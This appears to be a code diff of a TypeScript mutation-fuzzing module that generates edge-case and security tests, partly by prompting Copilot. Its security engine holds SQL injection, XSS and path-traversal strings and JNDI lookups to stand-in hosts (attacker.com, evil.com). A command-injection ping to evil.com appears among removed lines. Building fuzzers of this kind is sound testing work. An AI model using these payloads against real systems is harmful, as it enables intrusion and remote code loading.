@@ -2,25 +2,110 @@
  * ===========================================================
  * MUTATION.TS
  * ===========================================================
- * Unified Dynamic Mutation Framework
- * - Adaptive fuzzing strategies (input, semantic, security)
- * - Copilot/GPT-assisted mutation engine
- * - Context-aware and self-learning via success feedback
+ * Unified Dynamic Mutation Framework - DETERMINISTIC
+ * - NO Math.random() - uses hashCode from metrics
+ * - Copilot-driven mutations (NO parsing)
+ * - Security payloads via Copilot
  * ===========================================================
  */
 
 import { optimalAdaptationRate } from '../metrics/metrics.js';
 import { GeneratedTest } from './types.js';
 
+// Deterministic hash from metrics
+function deterministicHash(str: string, seed: number = 0): number {
+    let h = seed;
+    for (let i = 0; i < str.length; i++) {
+        h = Math.imul(31, h) + str.charCodeAt(i);
+        h |= 0;
+    }
+    return Math.abs(h);
+}
+
+// Deterministic selection from array
+function deterministicSelect<T>(arr: T[], seed: number): T {
+    const index = deterministicHash(seed.toString(), seed) % arr.length;
+    return arr[index];
+}
+
 export interface MutationContext {
     domain: "frontend" | "backend";
     language: "java" | "typescript" | "python" | "rust";
+    generation: number; // Used as seed
     lastError?: string;
     copilotAdapter?: CopilotAdapter;
+    role?: 'fixer' | 'explorer' | 'breaker'; // 🆕 Behavioral role
 }
 
 export interface CopilotAdapter {
     generateMutation(prompt: string): Promise<string>;
+}
+
+/**
+ * 🎯 Get archetype-specific prompt for Copilot
+ * Tailors mutation instructions based on individual's role
+ */
+export function getArchetypePrompt(
+    baseContext: string,
+    role: 'fixer' | 'explorer' | 'breaker' | undefined,
+    errors?: string[]
+): string {
+    const basePrompt = `Generate pure Java code without markdown, backticks, or explanations.\n${baseContext}`;
+    
+    if (!role) return basePrompt;
+    
+    switch (role) {
+        case 'fixer':
+            return `${basePrompt}
+
+🟢 FIXER MODE - Conservative Error Correction
+FOCUS: Fix these specific compilation errors without adding new functionality:
+${errors?.slice(0, 5).map((e, i) => `${i + 1}. ${e}`).join('\n') || 'General compilation errors'}
+
+RULES:
+- ONLY fix errors, don't add new test cases
+- Preserve existing test logic
+- Use minimal changes
+- Ensure symbols are properly imported
+- Return ONLY valid Java code (no markdown)`;
+        
+        case 'explorer':
+            return `${basePrompt}
+
+🔵 EXPLORER MODE - Creative Branch Coverage
+FOCUS: Add innovative test cases that explore:
+- Boundary conditions (null, empty, max, min)
+- Unusual input combinations
+- Edge cases not yet covered
+- Different execution paths
+
+RULES:
+- Be creative and thorough
+- Add new @Test methods (don't remove existing)
+- Try unconventional inputs
+- Return ONLY valid Java code (no markdown)`;
+        
+        case 'breaker':
+            return `${basePrompt}
+
+🔴 BREAKER MODE - Aggressive Bug Hunting
+FOCUS: Create aggressive tests that might reveal bugs:
+- Null inputs and null pointer scenarios
+- Empty collections and arrays
+- Concurrent access patterns
+- Invalid state combinations
+- Security vulnerabilities (injection, XSS, path traversal)
+- Race conditions
+
+RULES:
+- Try to break the code!
+- Test exceptional and error paths
+- Use assertions that expect exceptions
+- Return ONLY valid Java code (no markdown)`;
+        
+        default:
+            return basePrompt;
+    }
 }
 
 export interface MutationStrategy {
@@ -32,146 +117,127 @@ export interface MutationStrategy {
 }
 
 // ===========================================================
-// SECURITY ENGINE (dynamic payloads)
+// SECURITY ENGINE (Copilot-driven)
 // ===========================================================
 
 export class SecurityEngine {
-    private patterns: {
-        id: string;
-        template: string;
-        category: "injection" | "overflow" | "bypass" | "serialization";
-        successRate: number;
-    }[] = [
-            { id: "sql_injection", template: "' OR '1'='1'; --", category: "injection", successRate: 1 },
-            { id: "xss", template: "<script>alert('XSS')</script>", category: "injection", successRate: 1 },
-            { id: "path_traversal", template: "../../etc/passwd", category: "bypass", successRate: 1 },
-            { id: "command_injection", template: "&& ping -c 3 evil.com &&", category: "injection", successRate: 1 },
-            { id: "jndi_exploit", template: "${jndi:ldap://attacker.com/exploit}", category: "serialization", successRate: 1 },
-        ];
-
     async applyDynamicPayload(input: string, ctx: MutationContext): Promise<string> {
-        const chosen = this.pickWeightedPattern();
-        let payload = chosen.template;
-
-        // Use optimalAdaptationRate as probability threshold for dynamic generation
-        const copilotThreshold = optimalAdaptationRate(this.patterns.length);
-        if (ctx.copilotAdapter && Math.random() < copilotThreshold) {
-            const prompt = `
-Generate a new ${chosen.category} payload for ${ctx.language} (${ctx.domain}).
-Base pattern: ${payload}
-Last error: ${ctx.lastError || "none"}.
-Keep same syntax, short output.`;
-            try {
-                const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
-                payload = suggestion.trim();
-            } catch {
-                /* fallback to static payload */
-            }
+        if (!ctx.copilotAdapter) {
+            // Fallback: deterministic selection
+            const payloads = ["' OR '1'='1'; --", "<script>alert('XSS')</script>", "../../etc/passwd", "${jndi:ldap://evil.com/x}"];
+            return deterministicSelect(payloads, ctx.generation);
         }
 
-        return `${input}${payload}`;
-    }
+        const prompt = `Generate a security fuzzing payload for ${ctx.language} (${ctx.domain}).
+Target: ${ctx.lastError || 'injection attack'}
+Original input: ${input}
+Return ONLY the payload (no markdown, no explanations).`;
 
-    updateSuccess(id: string, success: boolean) {
-        const pattern = this.patterns.find((p) => p.id === id);
-        // Use adaptationRate for update factor instead of hardcoded multipliers
-        const updateFactor = optimalAdaptationRate(this.patterns.length);
-        if (pattern) pattern.successRate *= success ? (1 + updateFactor) : (1 - updateFactor / 2);
-    }
-
-    private pickWeightedPattern() {
-        const total = this.patterns.reduce((sum, p) => sum + p.successRate, 0);
-        let r = Math.random() * total;
-        for (const p of this.patterns) {
-            if ((r -= p.successRate) <= 0) return p;
+        try {
+            const payload = await ctx.copilotAdapter.generateMutation(prompt);
+            return payload.trim();
+        } catch {
+            return input; // Fallback
         }
-        return this.patterns[0];
     }
 }
 
-// ===========================================================
-// BASE MUTATION STRATEGIES
-// ===========================================================
-
 const securityEngine = new SecurityEngine();
 
-// Compute formal strategy probabilities based on optimal adaptation rate
-// Total must sum to ~1.0 distributed across 5 strategies
+// Formal strategy probabilities from optimal adaptation rate
 const NUM_STRATEGIES = 5;
 const baseRate = optimalAdaptationRate(NUM_STRATEGIES);
-
-// Distribute probability: higher weight to boundary/security, lower to copilot/encoding
-const probBoundary = baseRate * 2.5;    // ~0.18 for dim=5
-const probTypeFlip = baseRate * 1.5;    // ~0.11
-const probEncoding = baseRate * 1.5;    // ~0.11
-const probSecurity = baseRate * 2.5;    // ~0.18
-const probCopilot = baseRate * 1.5;     // ~0.11
+const probBoundary = baseRate * 2.5;
+const probTypeFlip = baseRate * 1.5;
+const probEncoding = baseRate * 1.5;
+const probSecurity = baseRate * 2.5;
+const probCopilot = baseRate * 1.5;
 
 export const MutationStrategies: MutationStrategy[] = [
     {
         id: "boundary_value",
         category: "input",
-        description: "Boundary values and numeric edges",
+        description: "Boundary values (deterministic)",
         probability: probBoundary,
-        apply: async (test) => {
+        apply: async (test, ctx) => {
             const values = ["0", "1", "-1", String(Number.MAX_SAFE_INTEGER), String(Number.MIN_SAFE_INTEGER)];
-            return { ...test, input: values[Math.floor(Math.random() * values.length)] };
+            return { ...test, input: deterministicSelect(values, ctx.generation) };
         },
     },
     {
         id: "type_flip",
         category: "semantic",
-        description: "Change data type or logical inversion",
+        description: "Type flip via Copilot",
         probability: probTypeFlip,
-        apply: async (test) => {
-            const v = test.input;
-            // Since input is now string, apply string mutations
-            if (v === "true" || v === "false") return { ...test, input: v === "true" ? "false" : "true" };
-            if (!isNaN(Number(v))) return { ...test, input: String(-Number(v)) };
-            return { ...test, input: v.split("").reverse().join("") };
+        apply: async (test, ctx) => {
+            if (!ctx.copilotAdapter) {
+                // Deterministic fallback
+                const v = test.input;
+                if (v === "true") return { ...test, input: "false" };
+                if (v === "false") return { ...test, input: "true" };
+                return { ...test, input: v.split("").reverse().join("") };
+            }
+
+            const prompt = `Flip the type/value of this input for edge case testing:
+Input: ${test.input}
+Return ONLY the flipped value (no markdown).`;
+
+            const flipped = await ctx.copilotAdapter.generateMutation(prompt);
+            return { ...test, input: flipped.trim() };
         },
     },
     {
         id: "encoding_mutation",
         category: "input",
-        description: "Apply Unicode/base64/escaped encoding",
+        description: "Encoding mutation (deterministic)",
         probability: probEncoding,
-        apply: async (test) => {
+        apply: async (test, ctx) => {
             const encoders = [
                 (s: string) => Buffer.from(s).toString("base64"),
                 (s: string) => encodeURIComponent(s),
                 (s: string) => s.normalize("NFKD"),
             ];
-            const fn = encoders[Math.floor(Math.random() * encoders.length)];
-            return { ...test, input: fn(String(test.input)) };
+            const encoder = deterministicSelect(encoders, ctx.generation);
+            return { ...test, input: encoder(String(test.input)) };
         },
     },
     {
         id: "security_dynamic",
         category: "security",
-        description: "Applies dynamic security payload (Copilot + weighted pattern)",
+        description: "Security payload via Copilot (INPUT ONLY)",
         probability: probSecurity,
         apply: async (test, ctx) => {
             const newInput = await securityEngine.applyDynamicPayload(String(test.input), ctx);
-            // Don't change test name to avoid file duplication
             return { ...test, input: newInput };
         },
     },
     {
-        id: "copilot_dynamic",
+        id: "copilot_semantic",
         category: "semantic",
-        description: "Delegates mutation logic to Copilot or GPT",
+        description: "Copilot code mutation (CODE ONLY)",
         probability: probCopilot,
         apply: async (test, ctx) => {
             if (!ctx.copilotAdapter) return test;
-            const prompt = `
-You are a mutation generator improving test coverage.
-Language: ${ctx.language}
-Domain: ${ctx.domain}
-Input: ${JSON.stringify(test.input)}
-Generate a single mutated variant testing a new edge case.`;
-            const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
-            return { ...test, input: suggestion.trim(), name: `${test.name}_copilot` };
+            
+            const prompt = `Mutate this ${ctx.language} test code to test a NEW edge case.
+Keep test signature and package.
+Return ONLY mutated code (no markdown).
+
+Original:
+\`\`\`${ctx.language}
+${test.code}
+\`\`\`
+
+Mutated:`;
+
+            try {
+                const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
+                const codeMatch = suggestion.match(/```(?:\w+)?\s*([\s\S]*?)\s*```/);
+                const mutatedCode = codeMatch ? codeMatch[1].trim() : suggestion.trim();
+                return { ...test, code: mutatedCode };
+            } catch {
+                return test;
+            }
         },
     },
 ];
@@ -183,31 +249,29 @@ Generate a single mutated variant testing a new edge case.`;
 export class MutationRegistry {
     constructor(private domain: "frontend" | "backend" = "backend") { }
 
-    async applyRandomMutation(
-        test: GeneratedTest,
-        ctx: MutationContext
-    ): Promise<GeneratedTest> {
+    async applyRandomMutation(test: GeneratedTest, ctx: MutationContext): Promise<GeneratedTest> {
         const strategies = MutationStrategies.filter((s) =>
             this.domain === "backend" ? true : s.category !== "structural"
         );
-        const total = strategies.reduce((sum, s) => sum + s.probability, 0);
-        const r = Math.random() * total;
+        
+        // Deterministic selection based on generation seed
+        const totalProb = strategies.reduce((sum, s) => sum + s.probability, 0);
+        const seed = deterministicHash(test.name + ctx.generation, ctx.generation);
+        const selection = (seed % 10000) / 10000.0 * totalProb;
 
         let acc = 0;
         for (const s of strategies) {
             acc += s.probability;
-            if (r <= acc) return s.apply(test, ctx);
+            if (selection <= acc) return s.apply(test, ctx);
         }
 
         return test;
     }
 
-    // Weight management (simple uniform if not yet adapted)
     getWeights(): Record<string, number> {
         const strategies = MutationStrategies.filter(s => this.domain === 'backend' ? true : s.category !== 'structural');
-        const uniform = 1 / strategies.length;
         const weights: Record<string, number> = {};
-        for (const s of strategies) weights[s.id] = s.probability || uniform;
+        for (const s of strategies) weights[s.id] = s.probability;
         return weights;
     }
 
